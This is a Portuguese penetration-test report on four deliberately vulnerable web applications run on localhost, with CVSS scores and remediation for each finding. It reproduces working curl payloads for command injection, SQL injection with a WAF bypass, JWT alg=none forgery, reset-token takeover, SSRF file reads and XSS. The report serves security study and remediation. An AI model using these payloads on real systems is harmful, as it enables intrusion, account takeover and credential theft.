# Relatório de Ataque — Aplicações Web dos Labs

**Classificação:** Confidencial — exercício controlado
**Data da execução:** 26/10/2026
**Autor:** Daniel Fernandes
**Escopo:** aplicações vulneráveis executadas localmente (`127.0.0.1`)
**Autorização:** ambientes de laboratório próprios, criados para estudo de segurança ofensiva. Nenhum sistema de terceiros foi acessado.

---

## 1. Sumário executivo

Foram atacadas quatro aplicações web intencionalmente vulneráveis. Em todas foi possível
comprometer dados ou execução de código. O cenário mais grave é o do **dv-bookshop**, onde uma
sequência de falhas permitiu **execução remota de comandos (RCE)** com o usuário do sistema
operacional, além de **tomada de conta do administrador** e leitura de arquivos locais.

### Totais

| Severidade | Qtde | Distribuição |
|---|---|---|
| Crítica | 9 | dv-bookshop (6), vulnshop (3) |
| Alta | 6 | dv-bookshop (3), vulnshop (1), websec-sqli (1), Juice Shop (1) |
| Média | 9 | dv-bookshop (4), vulnshop (1), Juice Shop (4) |
| Baixa | 5 | dv-bookshop (3), websec-sqli (1), Juice Shop (1) |
| Informativa | 3 | dv-bookshop (1), Juice Shop (2) |
| **Total** | **32** | |

### Resultado por alvo

| Alvo | Porta | Stack | Pior achado | Status |
|---|---|---|---|---|
| **dv-bookshop** | 5005 | Flask + SQLite | RCE via command injection + debugger Werkzeug | comprometido por completo |
| **vulnshop** | 5000 | Flask + SQLite | SQLi com dump de credenciais + debugger | comprometido por completo |
| **websec-sqli** | 5003 | Express + node:sqlite | SQLi que expõe as senhas de todos os usuários | dados expostos |
| **Juice Shop** | 3000 | Node/Express | credenciais padrão de admin + hash de senha no JWT | acesso administrativo |

### Cadeias de ataque comprovadas

1. **dv-bookshop: SQLi → sessão de admin → RCE**
   `POST /login` com bypass de WAF → sessão `admin` → `POST /admin/ping` com `; id; uname -a`
   → execução de comandos no host.
2. **dv-bookshop: reset de senha previsível → takeover**
   token `md5(usuário + segredo estático)` (e o link é exibido na própria resposta) → troca da
   senha do admin → login administrativo.
3. **dv-bookshop: JWT forjável → flag**
   `alg=none` aceito e HS256 assinado com `secret` → `role=admin` → `/api/jwt/admin` devolve a
   flag e o `secret_note` do admin.
4. **vulnshop: SQLi → credenciais → painel admin**
   `UNION SELECT` em `/products` devolve usuário/senha; `/admin` não verifica o papel.

---

## 2. Metodologia

1. **Reconhecimento passivo:** `robots.txt`, respostas de erro, headers, `/app.py.bak`, listagem
   de diretórios.
2. **Análise de código** (os labs têm código-fonte disponível) para confirmar hipóteses e
   identificar rotas não linkadas (`/debug_db`, `/admin/ping`, `/api/user/<id>/card`).
3. **Testes manuais com `curl`**, sessão em cookie jar, para cada classe de falha.
4. **Fuzzing automatizado** com RESTler e Schemathesis sobre o contrato OpenAPI do Juice Shop.
5. **Varredura passiva** com OWASP ZAP (baseline) para headers e configurações.
6. **Validação com ferramentas forenses/estáticas** (JWT, segredos, SQLite) para confirmar
   impacto dos dados encontrados.

Ferramentas: `curl`, `jwt_tool`, `gitleaks`, `schemathesis`, `RESTler 9.3.1`, `OWASP ZAP`,
`sqlite3mc`, `sqlite_dissect`, `undark`, `sqlite_carver`, `forensics-sqlite`.
Os relatórios individuais de validação de cada ferramenta estão em `reports/`.

> Observação: as quatro aplicações são **intencionalmente vulneráveis** (labs de estudo). Os
> achados abaixo descrevem o comportamento real observado, com comandos reproduzíveis, e não
> constituem vulnerabilidades desconhecidas dos fornecedores.

---

## 3. dv-bookshop — `http://127.0.0.1:5005`

Aplicação de livraria (Flask + SQLite) com painel administrativo, JWT, uploads e um laboratório
de corrida (race condition).

### DV-01 — Execução remota de comandos em `/admin/ping` (Crítica)

**Endpoint:** `POST /admin/ping` (requer sessão admin) · parâmetro `host`
**Causa:** `subprocess.check_output(f"ping -c 2 {host}", shell=True)`

```bash
curl -s -b admin.jar -X POST http://127.0.0.1:5005/admin/ping \
     --data-urlencode "host=127.0.0.1; id; uname -a"
```

Saída observada:

```
uid=1001(daniel) gid=1001(daniel) grupos=1001(daniel),100(users)
Linux vostro 6.12.111+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.111-1 (2026-09-28) x86_64 GNU/Linux
```

**Impacto:** execução de comandos arbitrários com o usuário do processo → leitura/gravação de
arquivos, pivot para o host, exfiltração do banco e das chaves.
**CVSS estimado:** 9,1 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H) — sobe para 9,9 se combinado com
DV-02 (obtenção de sessão admin sem credenciais).
**Remediação:** não usar `shell=True`; validar `host` com allowlist de IP/hostname; executar
`ping` com lista de argumentos e timeout; rodar o processo com usuário sem privilégios.

### DV-02 — SQL injection no login com bypass de WAF (Crítica)

**Endpoint:** `POST /login` · campos `username`/`password`
**Causa:** fallback para query concatenada quando a consulta parametrizada não retorna usuário;
WAF por blacklist que se desativa se a entrada contiver `/*!50000`.

Payload usado (o comentário desativa o WAF **e** comenta o resto da query):

```bash
curl -c admin.jar -X POST http://127.0.0.1:5005/login \
     --data-urlencode "username=admin' OR 1=1 /*!50000" \
     --data-urlencode "password=x"
# 302 -> /
curl -b admin.jar -o /dev/null -w "%{http_code}" http://127.0.0.1:5005/admin
# 200 (Admin Dashboard)
```

Controle negativo: `username=admin' -- ` é bloqueado pelo WAF
(`WAF Detection: Potential SQL injection detected!`), mas o bypass acima funciona.

**Impacto:** autenticação como o primeiro usuário da tabela (admin) sem senha.
**CVSS estimado:** 9,8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).
**Remediação:** remover o caminho de query concatenada; parametrizar sempre; trocar blacklist por
validação de tipo; não aceitar comentários SQL.

### DV-03 — Tomada de conta via token de reset previsível (Crítica)

**Endpoints:** `POST /forgot_password`, `GET/POST /reset_password/<token>`
**Causa:** `token = md5(username + STATIC_RESET_SECRET)` com
`STATIC_RESET_SECRET = 'khitminnyo2025'`; além disso a resposta de `/forgot_password` exibe o
link de reset em mensagem flash.

```bash
python3 -c "import hashlib;print(hashlib.md5(b'adminkhitminnyo2025').hexdigest())"
# efa8a34e635b548419e13022e9cbb724
curl -X POST http://127.0.0.1:5005/forgot_password -d "username=admin"
# resposta exibe: /reset_password/efa8a34e635b548419e13022e9cbb724
curl -X POST http://127.0.0.1:5005/reset_password/efa8a34e635b548419e13022e9cbb724 \
     -d "password=Owned123!"
curl -c takeover.jar -X POST http://127.0.0.1:5005/login \
     -d "username=admin&password=Owned123!"
# 302 -> /   e   GET /admin = 200
```

**Impacto:** qualquer pessoa toma a conta de qualquer usuário (inclusive admin) sem acesso ao
e-mail, apenas conhecendo o username.
**CVSS estimado:** 9,1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N).
**Remediação:** token aleatório (≥128 bits) com CSPRNG, uso único, validade curta, armazenado com
hash e vinculado ao usuário; enviar **somente por e-mail**; invalidar sessões após o reset.
**Observação:** após o teste, `users.db` foi restaurado e a senha original voltou a funcionar.

### DV-04 — JWT forjável: `alg=none` e segredo fraco (Crítica)

**Endpoint:** `GET /api/jwt/admin` · header `Authorization: Bearer <token>`
**Causa:** `jwt_decode` confia no `alg` do header; em modo inseguro aceita `none` e valida HS256
com `JWT_SECRET = 'secret'`.

```bash
# alg=none
curl -s -H "Authorization: Bearer $TOKEN_NONE" http://127.0.0.1:5005/api/jwt/admin
# HS256 assinado com "secret" e role=admin
curl -s -H "Authorization: Bearer $TOKEN_HS256" http://127.0.0.1:5005/api/jwt/admin
```

Resposta (nos dois casos):

```json
{
  "flag": "CTF{Bl1nd_SQL1_M4st3r_T1m3_B4s3d_2025}",
  "message": "Welcome, admin."
}
```

Controle: token com `role=user` → `{"error": "Admin role required"}`.

**Impacto:** escalada para administrador e vazamento do segredo/flag do admin.
**CVSS estimado:** 9,1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N).
**Remediação:** fixar o algoritmo esperado (`HS256`) e rejeitar `none`; segredo aleatório de
≥256 bits fora do código; validar `exp`, `iss`, `aud`; nunca autorizar somente pelo claim `role`
sem checar o usuário no banco.

### DV-05 — SSRF com leitura de arquivos locais em `/admin/preview_url` (Alta)

**Endpoint:** `POST /admin/preview_url` (admin) · parâmetro `url`
**Causa:** `urlopen(url)` sem allowlist de esquema/host.

```bash
curl -s -b admin.jar -X POST http://127.0.0.1:5005/admin/preview_url \
     --data-urlencode "url=file:///etc/passwd"
# root:x:0:0:root:/root:/bin/bash
curl -s -b admin.jar -X POST http://127.0.0.1:5005/admin/preview_url \
     --data-urlencode "url=http://127.0.0.1:5005/debug_db"
# dump completo de usuários (via SSRF interno)
```

**Impacto:** leitura de arquivos do servidor (`file://`), acesso a serviços internos e
contorno de controles de rede. Combinado com DV-01/DV-03, é caminho alternativo para
exfiltração.
**CVSS estimado:** 8,6 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N).
**Remediação:** allowlist de domínios e esquemas (`https` apenas), bloquear IPs privados/
loopback/link-local, resolver DNS e revalidar o IP conectado (anti-rebinding), sem `file://`.

### DV-06 — `/debug_db` sem autenticação expõe senhas, cartões e flag (Crítica)

**Endpoint:** `GET /debug_db` (público)

```
User: admin | Email: admin@bookshop.com | Pass: SuperSecurePass2025! | Card: 4532-0000-0000-0001 | Note: CTF{Bl1nd_SQL1_M4st3r_T1m3_B4s3d_2025}
User: alice_hacker | Email: alice@hack.com | Pass: password123 | Card: 4532-1234-5678-9012 | ...
```

**Impacto:** dump completo de PII, credenciais em texto plano, cartões e segredo do admin.
**CVSS estimado:** 9,1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) — com reuso de senha, alto impacto
de integridade também.
**Remediação:** remover a rota do build de produção; exigir autenticação + autorização; nunca
retornar senhas (usar hash forte).

### DV-07 — Backup de código exposto (`/app.py.bak`) (Alta)

**Endpoint:** `GET /app.py.bak` → **83.994 bytes** de código-fonte, incluindo
`app.secret_key`, `JWT_SECRET`, `STATIC_RESET_SECRET` e lógica de todas as rotas.

**Impacto:** revela segredos e o mapa completo de rotas administrativas (`/admin/ping`,
`/admin/preview_url`, `/api/update_role`), reduzindo o esforço de exploração a zero.
**CVSS estimado:** 7,5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).
**Remediação:** não publicar fontes/backups; bloquear `*.bak`, `*.old`, `*.zip` no servidor;
mover segredos para variáveis de ambiente/secret manager.

### DV-08 — IDOR sem autenticação em `/api/user/<id>/card` (Alta)

```bash
curl -s http://127.0.0.1:5005/api/user/1/card
```

```json
{"card_expiry":"12/27","card_number":"4532-0000-0000-0001","username":"admin"}
```

**Impacto:** enumeração de IDs (1..20) devolve número e validade do cartão de todos os clientes,
sem login.
**CVSS estimado:** 7,5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).
**Remediação:** exigir autenticação e verificar propriedade (`session.user_id == id` ou role
admin); retornar somente os 4 últimos dígitos; nunca expor PAN completo.

### DV-09 — Debugger Werkzeug ativo em produção (`debug=True`) (Crítica)

`app.run(debug=True, host='0.0.0.0', port=5005)`; `/console` responde **200** e páginas de erro
exibem traceback, trechos de código e o `SECRET` do console.
No vulnshop (DV de outro alvo) o traceback expôs `SECRET = "KKcnTvd0eTDi3HTXr39F"`.

**Impacto:** vazamento de código/segredos e, com o PIN do console, execução de Python no servidor
(RCE) — caminho alternativo ao DV-01, sem precisar de admin.
**CVSS estimado:** 9,8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) quando o console é acessível.
**Remediação:** `debug=False`; nunca expor o servidor de desenvolvimento (usar gunicorn/uwsgi);
restringir `/console` por IP.

### DV-10 — XSS refletido na busca de livros (Média)

```bash
curl -s -G http://127.0.0.1:5005/books \
  --data-urlencode "search=<script>alert(document.domain)</script>"
# <script>alert(document.domain)</script> refletido sem escape
```

**Impacto:** execução de JavaScript no navegador da vítima (roubo de sessão, CSRF a partir da
origem, keylogging).
**CVSS estimado:** 6,1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N).
**Remediação:** escape contextual no template (Jinja2 autoescape já ativo — o problema é o uso
de `|safe`/concatenação); CSP restritiva; validar entrada.

### DV-11 — IDOR em `/profile?user_id=` (Média)

Autenticado como `alice_hacker`, `GET /profile?user_id=1` retorna e-mail e cartão do admin:

```bash
curl -b alice.jar "http://127.0.0.1:5005/profile?user_id=1"
# admin@bookshop.com, 4532-0000-0000-0001
```

**Impacto:** acesso a dados de perfil de outros usuários (PII + cartão).
**CVSS estimado:** 6,5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N).
**Remediação:** ignorar `user_id` vindo do cliente; usar o ID da sessão (ou exigir admin).

### DV-12 — IDOR em recibos `/download_receipt/<id>` (Média)

Usuário `bob_secure` cria o pedido `#1`; `alice_hacker` baixa o recibo:

```bash
curl -b alice.jar http://127.0.0.1:5005/download_receipt/1
# === RECEIPT — Order #1 === Shipping: Rua Teste 1 ...
```

**Impacto:** vazamento de endereço de entrega, itens e valores de pedidos de terceiros.
**CVSS estimado:** 5,3 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N).
**Remediação:** `WHERE id = ? AND user_id = ?`.

### DV-13 — Manipulação de preço no checkout (Média)

`POST /checkout` aceita `total` do cliente: um livro de US$ 45,90 foi comprado por **US$ 0,01**
(pedido `#1`, `total=0.01` no banco).

**Impacto:** perda financeira direta e fraude de pedidos.
**CVSS estimado:** 6,5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N).
**Remediação:** calcular o total exclusivamente no servidor a partir do carrinho; validar
quantidade (>0) e preço; usar transação com verificação de saldo.

### DV-14 — Open redirect (Baixa)

```bash
curl -s -o /dev/null -w "%{redirect_url}" \
  "http://127.0.0.1:5005/redirect?url=https://evil.example/pwn"
# https://evil.example/pwn
```
Também em `/login` via `next`. **Impacto:** phishing e evasão de filtros de URL.
**CVSS estimado:** 4,3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N).
**Remediação:** allowlist de destinos ou aceitar apenas caminhos relativos.

### DV-15 — Listagem de diretório em `/uploads` (Baixa)

`GET /uploads` lista arquivos enviados (`default.png` e uploads de usuários), sem auth.

**Remediação:** desabilitar listagem; servir arquivos com autorização; renomear com UUID.

### DV-16 — `robots.txt` revela rotas sensíveis (Informativa)

`Disallow: /admin, /debug_db, /api/, /admin/ping, /admin/preview_url, /.git/` — um mapa das
rotas que o atacante deve testar.

**Remediação:** não listar rotas privadas; proteger por autenticação (não por obscuridade).

### DV-17 — SQLi UNION em `/book_details` (Alta)

```bash
curl -s -G http://127.0.0.1:5005/book_details \
  --data-urlencode "id=0 UNION SELECT 1,action,details,1,1,1,1,1 FROM admin_logs /*!50000"
# exibe: "Host: 127.0.0.1; id; uname -a" (comando injetado no log)
```

Erro-based: `id=1'` → `SQL Error: unrecognized token: "'"` (mensagem verbosa).
**Impacto:** leitura arbitrária das tabelas do banco da loja (`admin_logs`, `orders`,
`support_tickets`) e enumeração de esquema via `sqlite_master`.
**CVSS estimado:** 8,6 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N).
**Remediação:** consultas parametrizadas; não retornar mensagens de erro do banco; desativar
`debug`.

### DV-18 — Ausência de rate limit / lockout no login (Média)

Sete tentativas erradas seguidas para `admin` não geraram bloqueio (`Incorrect password` em
todas). O contador existe, mas não bloqueia no modo inseguro (`E2_rate_limit = False`).

**Impacto:** brute force e password spraying viáveis.
**CVSS estimado:** 5,3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).
**Remediação:** lockout progressivo por conta e por IP, CAPTCHA após N falhas, MFA para admin.

### DV-19 — Senhas em texto plano no banco (Alta — revisão de código/dados)

`users.db` contém `password TEXT` com `SuperSecurePass2025!`, `password123`, `bob2025secure`…
confirmado pelo `/debug_db` e pelo dump do WAL.

**Impacto:** qualquer leitura do arquivo (backup, LFI, RCE) entrega todas as credenciais;
reuso de senha amplia o dano.
**Remediação:** Argon2id/bcrypt com salt; migrar usuários; nunca logar senhas.

### DV-20 — Outros pontos identificados em código (não explorados no teste)

| ID | Item | Risco |
|---|---|---|
| DV-21 | CSRF em `/add_to_cart`, `/admin/reset_data`, `/profile` (sem token) | Médio |
| DV-22 | Quantidade negativa no carrinho (`quantity` aceita valor negativo) | Médio |
| DV-23 | Session fixation (não regenera o ID no login) | Médio |
| DV-24 | Enumeração de usuário no login/registro (mensagens distintas) | Baixo |

---

## 4. vulnshop — `http://127.0.0.1:5000`

Loja Flask + SQLite usada como introdução a SQLi/XSS/CSRF.

### VS-01 — SQL injection com dump de credenciais em `/products?id=` (Crítica)

```bash
curl -s -G http://127.0.0.1:5000/products \
  --data-urlencode "id=0 UNION SELECT 0,username,0,password FROM users"
```

Resultado renderizado na página:

```
admin  /  admin123
alice  /  pass123
bob    /  bob456
```

**Impacto:** leitura de toda a tabela `users` (senhas em texto plano) por um endpoint público.
**CVSS estimado:** 9,8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).
**Remediação:** `WHERE id = ?` com parâmetro; validar inteiro; princípio do menor privilégio no
usuário do banco.

### VS-02 — Bypass de autenticação por SQLi em `/login` (Crítica)

```bash
curl -c vs.jar -X POST http://127.0.0.1:5000/login \
  --data-urlencode "username=' OR '1'='1' -- " --data-urlencode "password=x"
# 302 -> / (autenticado como o primeiro usuário: admin)
```

**Impacto:** acesso administrativo sem credenciais.
**CVSS estimado:** 9,8.
**Remediação:** query parametrizada; mensagem de erro genérica.

### VS-03 — Broken access control em `/admin` (Alta)

Usuária comum `alice` acessa `GET /admin` → **200** e vê a lista completa de usuários, incluindo
`admin@shop.com / admin123`.

**Impacto:** escalada de privilégio e exposição de credenciais.
**CVSS estimado:** 8,1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N).
**Remediação:** `if session.get('role') != 'admin': abort(403)`; nunca renderizar senhas.

### VS-04 — XSS refletido em `/search?q=` (Média)

```bash
curl -s -G http://127.0.0.1:5000/search \
  --data-urlencode "q=<script>alert('XSS')</script>"
# <script>alert('XSS')</script> refletido
```

**CVSS estimado:** 6,1. **Remediação:** escape de saída + CSP.

### VS-05 — Debugger Werkzeug exposto (`debug=True`) (Crítica)

`/products?id=abc` gera **TypeError** e a página do Werkzeug Debugger com traceback completo,
código-fonte e `SECRET = "KKcnTvd0eTDi3HTXr39F"` (usado pelo console interativo).

**Impacto:** vazamento de código/segredo; console do debugger = RCE se o PIN for obtido/derivado.
**CVSS estimado:** 9,8. **Remediação:** `debug=False`, servidor WSGI de produção.

### VS-06 — CSRF em `/profile` (Média)

Sem token CSRF, um POST de outra origem altera e-mail/senha do usuário autenticado:

```bash
curl -b vs.jar -X POST http://127.0.0.1:5000/profile \
  -d "email=hacked@evil.com&password=novasenha"
# 200 e o e-mail passa a ser hacked@evil.com
```

**Impacto:** takeover de conta via página maliciosa.
**CVSS estimado:** 6,5. **Remediação:** token CSRF por sessão, `SameSite=Lax/Strict`,
verificação de `Origin`.

### VS-07 — Senhas em texto plano e sem rate limit (Alta/Média)

`database.py` grava `admin123`, `pass123`, `bob456` em texto plano; 7 tentativas erradas não
bloqueiam a conta.

**Remediação:** hash forte (Argon2id), lockout, MFA para admin.

---

## 5. websec-sqli — `http://127.0.0.1:5003`

Lab Express + `node:sqlite` que contrasta endpoint vulnerável e seguro.

### WS-01 — SQL injection em `/search/vulnerable?username=` (Alta)

```bash
curl -s -G http://127.0.0.1:5003/search/vulnerable \
  --data-urlencode "username=none' UNION SELECT id,username,password,is_admin FROM users--"
```

Resposta (trecho):

```json
{"executedSql":"SELECT id, username, email, is_admin AS isAdmin FROM users WHERE username = 'none' UNION SELECT id,username,password,is_admin FROM users--'",
 "users":[
  {"id":1,"username":"admin","email":"AdminPass123!","isAdmin":1},
  {"id":2,"username":"user1","email":"UserPass123!","isAdmin":0},
  {"id":3,"username":"moderator","email":"ModPass123!","isAdmin":0}]}
```

O campo `email` recebe a coluna `password` deslocada pelo UNION — ou seja, **todas as senhas
foram exfiltradas**.

**Impacto:** dump de credenciais e de flags de admin por endpoint público.
**CVSS estimado:** 8,2 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).
**Remediação:** o próprio lab já traz o contraste — usar `/search/secure`, com validação
(`^[a-zA-Z0-9_]+$`, ≤30 chars) e query parametrizada.

### WS-02 — `/search/secure` bloqueia corretamente (controle)

```bash
curl -G http://127.0.0.1:5003/search/secure \
  --data-urlencode "username=none' UNION SELECT ... --"
# 400 VALIDATION_ERROR (username may contain only latin letters, numbers and underscore)
```

Confirma que a correção (validação + prepared statement) neutraliza o ataque.

### WS-03 — `/security-events` expõe o log de tentativas sem autenticação (Baixa)

`GET /security-events` devolve JSON com todos os payloads enviados, rotas e horários. Útil para
detecção, mas é informação de segurança acessível a qualquer um.

**Remediação:** exigir autenticação/autorização no endpoint de auditoria e limitar a retenção.

---

## 6. Juice Shop — `http://127.0.0.1:3000`

Alvo principal do fuzzing automatizado (RESTler/Schemathesis/ZAP), com confirmação manual.

### JS-01 — Credenciais padrão do administrador (Crítica)

```bash
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}'
# 200 + JWT com role=admin
```

Com o token, `GET /api/Users` retorna **23 usuários** (e-mails, papéis, tokens).

**Impacto:** controle total da aplicação.
**CVSS estimado:** 9,1. **Remediação:** forçar troca de senha no primeiro acesso; política de
senha; MFA; bloquear contas padrão.

### JS-02 — O JWT expõe o hash MD5 da senha (Média)

Payload do token emitido:

```json
{"id":1,"email":"admin@juice-sh.op","role":"admin",
 "password":"0192023a7bbd73250516f069df18b500","totpSecret":""}
```

`md5("admin123") = 0192023a7bbd73250516f069df18b500` — hash **não salgado**, quebrado online em
segundos.

**Impacto:** qualquer vazamento de token (logs, histórico, XSS) entrega a senha em texto plano
após crack trivial.
**CVSS estimado:** 5,3. **Remediação:** nunca incluir hash de senha no token; usar bcrypt/
Argon2id com salt; minimizar claims.

### JS-03 — 500 com stack trace e caminhos internos (Média)

Requisição com JSON malformado em `POST /b2b/v2/orders`:

```bash
curl -s -X POST http://127.0.0.1:3000/b2b/v2/orders \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"cid":"x","orderLines":[],"orderLinesData":"{invalid}'
```

```html
<title>SyntaxError: Unterminated string in JSON at position 54 (line 1 column 55)</title>
...
/juice-shop/build/server.js:357
/juice-shop/node_modules/body-parser/lib/read.js:137
/juice-shop/node_modules/express/lib/router/index.js:280
```

Descoberto também pelo **RESTler** (`main_driver_500` e `InvalidValueChecker_500`, cobertura
1/1, 256 mutações de corpo) e pelo **Schemathesis** (`ST103 Undocumented status code: 401`).

**Impacto:** revela stack, versões e estrutura interna; auxilia exploração direcionada.
**CVSS estimado:** 5,3. **Remediação:** handler de erro genérico, sem stack; `NODE_ENV=production`.

### JS-04 — CORS permissivo (`Access-Control-Allow-Origin: *`) (Média)

```bash
curl -s -D - -o /dev/null -H "Origin: https://evil.example" \
  http://127.0.0.1:3000/rest/user/whoami | grep -i access-control
# Access-Control-Allow-Origin: *
```

**Impacto:** qualquer origem lê respostas de endpoints públicos; se combinado com credenciais,
habilita leitura cross-site. Detectado pelo ZAP como *Cross-Domain Misconfiguration* (5
instâncias).
**CVSS estimado:** 5,3. **Remediação:** allowlist de origens; `Vary: Origin`; não refletir `*`
em rotas autenticadas.

### JS-05 — Headers de segurança ausentes (Média/Baixa)

ZAP baseline: **0 FAIL / 7 WARN / 61 PASS**, 9 alertas / 39 instâncias.
Confirmado manualmente: **sem `Content-Security-Policy`**; presentes `X-Frame-Options:
SAMEORIGIN`, `X-Content-Type-Options: nosniff`.

| Alerta ZAP | Risco | Instâncias |
|---|---|---|
| Content Security Policy (CSP) Header Not Set | Médio | 5 |
| Cross-Domain Misconfiguration | Médio | 5 |
| COEP Header Missing or Invalid | Baixo | 5 |
| COOP Header Missing or Invalid | Baixo | 5 |
| Deprecated Feature Policy Header Set | Baixo | 5 |
| Dangerous JS Functions | Baixo | 2 |
| Modern Web Application / Storable / Cacheable | Info | 3 |

**Remediação:** CSP com nonce/hash, COEP/COOP, substituir `Feature-Policy` por
`Permissions-Policy`.

### JS-06 — Status 401 não documentado no contrato (Informativa)

`POST /b2b/v2/orders` sem `Authorization` → **401**, mas a spec só documenta 2xx/4xx genéricos
(`ST103` do Schemathesis). Indica contrato incompleto e tratamento de auth antes da validação.

**Remediação:** documentar 401/403 e o esquema de segurança na OpenAPI; validar body antes de
checar auth não é requisito, mas o contrato deve refletir o comportamento.

---

## 7. Matriz consolidada de risco

| ID | Alvo | Achado | Sev. | CVSS* |
|---|---|---|---|---|
| DV-01 | dv-bookshop | RCE via command injection (`/admin/ping`) | Crítica | 9,1 |
| DV-02 | dv-bookshop | SQLi no login + bypass de WAF | Crítica | 9,8 |
| DV-03 | dv-bookshop | Reset token previsível → takeover | Crítica | 9,1 |
| DV-04 | dv-bookshop | JWT `none`/segredo fraco → admin | Crítica | 9,1 |
| DV-06 | dv-bookshop | `/debug_db` sem auth (senhas/cartões/flag) | Crítica | 9,1 |
| DV-09 | dv-bookshop | Werkzeug debugger + `/console` | Crítica | 9,8 |
| DV-05 | dv-bookshop | SSRF + LFI (`file:///etc/passwd`) | Alta | 8,6 |
| DV-07 | dv-bookshop | Backup de código `/app.py.bak` | Alta | 7,5 |
| DV-08 | dv-bookshop | IDOR de cartão sem auth | Alta | 7,5 |
| DV-17 | dv-bookshop | SQLi UNION em `/book_details` | Alta | 8,6 |
| DV-19 | dv-bookshop | Senhas em texto plano | Alta | 7,5 |
| DV-10 | dv-bookshop | XSS refletido | Média | 6,1 |
| DV-11 | dv-bookshop | IDOR de perfil | Média | 6,5 |
| DV-12 | dv-bookshop | IDOR de recibo | Média | 5,3 |
| DV-13 | dv-bookshop | Manipulação de preço | Média | 6,5 |
| DV-18 | dv-bookshop | Sem rate limit/lockout | Média | 5,3 |
| DV-14 | dv-bookshop | Open redirect | Baixa | 4,3 |
| DV-15 | dv-bookshop | Directory listing `/uploads` | Baixa | 5,3 |
| DV-16 | dv-bookshop | `robots.txt` revela rotas | Info | — |
| VS-01 | vulnshop | SQLi com dump de credenciais | Crítica | 9,8 |
| VS-02 | vulnshop | SQLi auth bypass | Crítica | 9,8 |
| VS-05 | vulnshop | Debugger Werkzeug | Crítica | 9,8 |
| VS-03 | vulnshop | Broken access control `/admin` | Alta | 8,1 |
| VS-04 | vulnshop | XSS refletido | Média | 6,1 |
| VS-06 | vulnshop | CSRF em `/profile` | Média | 6,5 |
| VS-07 | vulnshop | Senhas em texto plano / sem lockout | Alta | 7,5 |
| WS-01 | websec-sqli | SQLi (`/search/vulnerable`) | Alta | 8,2 |
| WS-03 | websec-sqli | Log de segurança público | Baixa | 3,7 |
| JS-01 | Juice Shop | Credenciais padrão de admin | Crítica | 9,1 |
| JS-02 | Juice Shop | Hash MD5 da senha no JWT | Média | 5,3 |
| JS-03 | Juice Shop | 500 com stack trace | Média | 5,3 |
| JS-04 | Juice Shop | CORS `*` | Média | 5,3 |
| JS-05 | Juice Shop | CSP ausente / headers fracos | Média | 4,3 |
| JS-06 | Juice Shop | 401 não documentado | Info | — |

\* CVSS 3.1 **estimado** para priorização; os vetores completos estão nas seções de cada achado.

---

## 8. Remediação priorizada

### Imediato (P0)
1. Remover `shell=True` do `/admin/ping` e validar o parâmetro (DV-01).
2. Parametrizar **todas** as queries e eliminar o fallback concatenado do login (DV-02, DV-17,
   VS-01, VS-02, WS-01).
3. Desativar `debug=True` e remover `/debug_db`, `/app.py.bak` e `/console` (DV-06, DV-07, DV-09,
   VS-05).
4. Token de reset com CSPRNG, uso único, validade curta e envio apenas por e-mail (DV-03).
5. Corrigir verificação de JWT (algoritmo fixo, segredo forte, `exp/iss/aud`) (DV-04).
6. Trocar credenciais padrão e exigir MFA para admin (JS-01).

### Curto prazo (P1)
7. Autorização por objeto em cartões, perfis e recibos (DV-08, DV-11, DV-12).
8. Allowlist de URLs/esquemas e bloqueio de IPs internos no preview (DV-05).
9. Hash forte de senhas (Argon2id) + migração (DV-19, VS-07).
10. Token CSRF + `SameSite` + verificação de `Origin` (VS-06, DV-21).
11. Total do checkout calculado no servidor; validar quantidade (DV-13, DV-22).
12. CSP/COEP/COOP e CORS por allowlist (JS-04, JS-05).

### Médio prazo (P2)
13. Rate limit/lockout progressivo e detecção de credential stuffing (DV-18, VS-07).
14. Escape contextual e revisão de `|safe` (DV-10, VS-04).
15. Allowlist de redirect e remoção de rotas do `robots.txt` (DV-14, DV-16).
16. Desabilitar listagem de `/uploads` e validar uploads (DV-15).
17. Remover hash de senha e dados sensíveis dos JWT (JS-02).
18. Handler de erro sem stack em produção (JS-03).

---

## 9. Anexos

### 9.1 Evidências em disco

```
labs/artifacts/attack/
├── app.py.bak                # 83.994 bytes de código-fonte (DV-07)
├── debug_db.txt              # dump de usuários/senhas/cartões/flag (DV-06)
├── card-idor.json            # cartão do admin sem auth (DV-08)
├── rce.txt                   # uid=1001 + uname -a (DV-01)
├── ssrf-lfi.txt              # root:x:0:0 de /etc/passwd (DV-05)
├── jwt-none.json             # flag via alg=none (DV-04)
├── jwt-forged.json           # flag via HS256 secret=secret (DV-04)
├── reset-token.txt           # md5(admin+segredo) (DV-03)
├── dv-sqli-union.txt         # exfiltração de admin_logs (DV-17)
├── idor-profile.txt          # PII/cartão do admin (DV-11)
├── idor-receipt.txt          # recibo do pedido de outro usuário (DV-12)
├── xss.txt                   # payload refletido (DV-10)
├── vs-xss.txt                # XSS no vulnshop (VS-04)
├── vs-sqli-union.txt         # credenciais via UNION (VS-01)
├── vs-bac.txt                # /admin acessível a usuário comum (VS-03)
├── vs-debugger.txt           # SECRET do Werkzeug (VS-05)
